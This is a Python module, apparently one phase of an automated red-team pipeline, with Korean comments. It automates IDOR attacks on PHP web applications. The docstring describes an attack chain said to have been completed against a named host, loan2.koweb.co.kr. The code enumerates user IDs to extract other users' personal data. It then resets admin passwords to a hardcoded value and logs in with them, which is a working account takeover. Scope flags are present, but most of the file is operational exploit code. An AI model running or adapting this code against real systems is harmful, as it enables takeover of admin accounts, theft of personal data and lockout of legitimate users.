"""
Phase 05 — IDOR & Privilege Escalation (권한상승)
==================================================
loan2.koweb.co.kr 실전에서 완성된 공격 체인:

  [인증 없음]
  1. phpinfo 노출 탐지 → 서버 정보 수집
  2. 관리자 패널 비인증 HTML 접근 확인
  3. 비인증 파일 업로드 탐지 (.php.gif GIF polyglot)

  [인증 있음 — 낮은 권한 계정]
  4. no 파라미터 열거 → 다른 사용자 개인정보 추출 (IDOR)
  5. mode=modify IDOR → 타 사용자 비밀번호 재설정 → admin 계정 탈취
  6. 재설정된 admin 비밀번호로 로그인 → 권한상승 완성

핵심 발견:
  - PHP auth 체크가 die()/exit() 없이 JS alert만 출력 → 파일 업로드 계속 실행
  - no 파라미터에 숫자 열거만으로 전체 회원 정보 접근 가능
  - 관리자도 다른 관리자 비밀번호 변경 가능 (IDOR 권한상승)
"""
from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

from ...tools.idor_scanner import IdorScanner, PasswordResetIdor, IdorResult
from ...core.authorization import AuthorizationContext
from ...redteam.session import RedTeamSession
from ...redteam.verification import VerificationEngine, Evidence, VulnType, Verdict


@dataclass
class IdorPhaseResult:
    phase: str = "idor"
    target: str = ""

    # IDOR 결과
    idor_hits: list[dict] = field(default_factory=list)
    total_idor_vulns: int = 0
    pii_extracted_count: int = 0

    # phpinfo
    phpinfo_urls: list[str] = field(default_factory=list)

    # 비인증 업로드
    unauth_upload_endpoints: list[dict] = field(default_factory=list)

    # 비인증 관리자 접근
    unauth_admin_pages: list[str] = field(default_factory=list)

    # 권한상승 결과
    privilege_escalation: bool = False
    escalated_credentials: list[dict] = field(default_factory=list)

    # 수집한 자격증명
    credentials: list[dict] = field(default_factory=list)

    error: str = ""

    def to_dict(self) -> dict:
        return {
            "phase": self.phase,
            "target": self.target,
            "idor_vulnerabilities": self.total_idor_vulns,
            "pii_extracted": self.pii_extracted_count,
            "phpinfo_exposed": self.phpinfo_urls,
            "unauth_upload": self.unauth_upload_endpoints,
            "unauth_admin": self.unauth_admin_pages,
            "privilege_escalation": self.privilege_escalation,
            "credentials": self.credentials,
            "idor_hits": self.idor_hits,
            "severity": "critical" if self.privilege_escalation or self.idor_hits else "info",
        }


class IdorPhase:
    """
    IDOR + 권한상승 자동화 Phase.

    exploit phase에서 관리자 세션이 있으면 IDOR로 최대한 추출.
    없으면 비인증 취약점(phpinfo, 비인증 업로드) 탐지.
    """

    def __init__(
        self,
        target: str,
        auth_ctx: AuthorizationContext,
        session: RedTeamSession | None = None,
        on_progress=None,
    ):
        self.target = target.rstrip("/")
        self.auth_ctx = auth_ctx
        self.session = session
        self.log = on_progress or print
        self.verifier = VerificationEngine(min_reproductions=1)

    def run(self) -> IdorPhaseResult:
        result = IdorPhaseResult(target=self.target)

        self.log("\n[bold yellow]🔍 Phase 5: IDOR & 권한상승[/bold yellow]")
        self.log(self.auth_ctx.to_human_notice())

        # 이전 단계에서 얻은 세션 쿠키 가져오기
        session_cookies = self._get_session_cookies()
        known_urls = self._get_known_urls()

        # 1. 비인증 스캔 (phpinfo, 비인증 업로드, 관리자 HTML 접근)
        self.log("\n[cyan]── 비인증 취약점 스캔 ──[/cyan]")
        unauth_scanner = IdorScanner(
            self.target,
            session_cookies=None,  # 인증 없이
            on_progress=self.log,
        )
        unauth_result = unauth_scanner.scan(
            known_urls=known_urls,
            id_range=(1, 10),  # 비인증: 좁은 범위
            check_phpinfo=True,
            check_unauth_upload=self.auth_ctx.scope.allow_webshell_test,
            check_admin_unauth=True,
        )
        result.phpinfo_urls = unauth_result.phpinfo_found
        result.unauth_upload_endpoints = unauth_result.unauth_upload_found
        result.unauth_admin_pages = unauth_result.unauth_admin_pages

        if result.phpinfo_urls:
            self.log(f"[red]🔴 phpinfo 노출: {result.phpinfo_urls}[/red]")
            self._record_finding("phpinfo_exposure", result.phpinfo_urls, "high")

        if result.unauth_admin_pages:
            self.log(f"[yellow]⚠ 관리자 패널 비인증 HTML 노출: {len(result.unauth_admin_pages)}개[/yellow]")
            self._record_finding("unauth_admin_html", result.unauth_admin_pages, "medium")

        if result.unauth_upload_endpoints:
            self.log(f"[red]🔴 비인증 파일 업로드: {len(result.unauth_upload_endpoints)}개[/red]")
            self._record_finding("unauth_file_upload", result.unauth_upload_endpoints, "critical")

        # 2. 인증 IDOR 스캔 (세션 있을 때)
        if session_cookies:
            self.log("\n[cyan]── 인증 IDOR 스캔 ──[/cyan]")
            auth_scanner = IdorScanner(
                self.target,
                session_cookies=session_cookies,
                on_progress=self.log,
            )
            auth_result = auth_scanner.scan(
                known_urls=known_urls,
                id_range=(1, 100),  # 인증 있을 때 넓은 범위
                check_phpinfo=False,
                check_unauth_upload=False,
                check_admin_unauth=False,
            )

            for hit in auth_result.hits:
                result.idor_hits.append({
                    "url": hit.url,
                    "param": hit.param,
                    "id": hit.tested_id,
                    "pii": hit.pii_found,
                    "severity": hit.severity,
                    "description": hit.description,
                    "snippet": hit.evidence_snippet[:200],
                })
                if hit.pii_found:
                    result.pii_extracted_count += 1

            result.total_idor_vulns = len(auth_result.hits)

            if result.idor_hits:
                self.log(
                    f"[bold red]🔴 IDOR: {result.total_idor_vulns}건, "
                    f"PII 노출: {result.pii_extracted_count}건[/bold red]"
                )
                self._record_finding("idor_pii", result.idor_hits, "critical")

            # 3. 권한상승: IDOR로 admin 비밀번호 재설정
            if (
                result.idor_hits
                and self.auth_ctx.scope.allow_admin_login
            ):
                self.log("\n[cyan]── IDOR 권한상승 시도 ──[/cyan]")
                self._attempt_privilege_escalation(result, session_cookies)

        # 세션 저장
        if self.session:
            self.session.add_finding(
                "idor", "IdorPhaseResult", result.to_dict(),
                "critical" if result.privilege_escalation or result.idor_hits else "info",
            )

        self.log(f"\n[bold]Phase 5 완료:[/bold] {result.total_idor_vulns}개 IDOR, 권한상승={result.privilege_escalation}")
        return result

    # ── 권한상승 ──────────────────────────────────────────────────────────────
    def _attempt_privilege_escalation(
        self, result: IdorPhaseResult, session_cookies: dict
    ):
        """
        loan2 패턴:
        1. mode=modify&no=<admin_no> 로 admin 비밀번호 재설정
        2. 재설정된 비밀번호로 로그인
        3. 관리자 로그인 성공 → 권한상승
        """
        import requests, urllib3
        urllib3.disable_warnings()

        pw_resetter = PasswordResetIdor(
            self.target,
            session_cookies=session_cookies,
            on_progress=self.log,
        )

        new_pw = "Bingo2024!@"

        # admin no 후보: 1, 2, 3 (보통 no=1이 최고 관리자)
        for admin_no in [1, 2, 3]:
            self.log(f"[cyan]  IDOR 비밀번호 재설정 시도: no={admin_no}[/cyan]")
            reset_result = pw_resetter.reset_password(
                target_no=admin_no,
                new_password=new_pw,
            )

            if not reset_result.get("success"):
                continue

            username = reset_result.get("username", "admin")
            self.log(f"[green]  ✅ 비밀번호 재설정 성공: {username} → {new_pw}[/green]")

            # 재설정된 비밀번호로 로그인 시도
            login_success = self._try_login(username, new_pw)
            if login_success:
                result.privilege_escalation = True
                cred = {
                    "username": username,
                    "password": new_pw,
                    "method": "IDOR password reset",
                    "target_no": admin_no,
                    "role": "admin (escalated)",
                }
                result.escalated_credentials.append(cred)
                result.credentials.append(cred)
                self.log(f"[bold green]🔥 권한상승 완성! {username}:{new_pw}[/bold green]")

                # 세션에 저장
                if self.session:
                    self.session.add_finding(
                        "idor", "PrivilegeEscalation",
                        {"credentials": cred, "method": "IDOR_password_reset"},
                        "critical",
                    )
                break

    def _try_login(self, username: str, password: str) -> bool:
        """관리자 로그인 시도"""
        import requests, urllib3
        urllib3.disable_warnings()

        admin_login_urls = [
            self.target + "/ko_admin/index.html",
            self.target + "/admin/index.php",
            self.target + "/admin/login.php",
        ]

        for login_url in admin_login_urls:
            try:
                s = requests.Session()
                s.verify = False
                s.headers.update({"User-Agent": "Mozilla/5.0"})

                r = s.post(
                    login_url,
                    data={
                        "mode": "login_proc",
                        "admin_id": username,
                        "admin_password": password,
                    },
                    timeout=10,
                    allow_redirects=True,
                )
                # 로그인 성공 판별: 로그아웃 버튼, 관리자 대시보드
                if r.status_code == 200:
                    success_signs = ["logout", "로그아웃", "dashboard", "대시보드"]
                    if any(s_sign.lower() in r.text.lower() for s_sign in success_signs):
                        return True
            except Exception:
                pass

        return False

    # ── 유틸리티 ──────────────────────────────────────────────────────────────
    def _get_session_cookies(self) -> dict | None:
        if not self.session:
            return None
        # exploit phase에서 저장된 관리자 쿠키 가져오기
        for finding in self.session.get_phase_findings("exploit"):
            data = finding.get("data", {})
            if isinstance(data, dict):
                cookies = data.get("admin_cookies") or data.get("session_cookies")
                if cookies:
                    return cookies
        return None

    def _get_known_urls(self) -> list[str]:
        if not self.session:
            return []
        urls = []
        for finding in self.session.get_phase_findings("recon"):
            data = finding.get("data", {})
            if isinstance(data, dict):
                urls.extend(data.get("urls", []))
        return urls[:50]

    def _record_finding(self, vuln_type: str, data: Any, severity: str):
        if self.session:
            self.session.add_finding("idor", vuln_type, data, severity)


# ── pipeline.py에서 호출하는 진입점 ──────────────────────────────────────────
def run_phase(
    target: str,
    context: dict,
    session: RedTeamSession | None = None,
) -> dict:
    auth_ctx = context.get("auth_ctx")
    on_progress = context.get("on_progress")

    if not auth_ctx:
        from ...core.authorization import create_auth_context
        auth_ctx = create_auth_context(target)

    phase = IdorPhase(
        target=target,
        auth_ctx=auth_ctx,
        session=session,
        on_progress=on_progress,
    )
    result = phase.run()
    return result.to_dict()
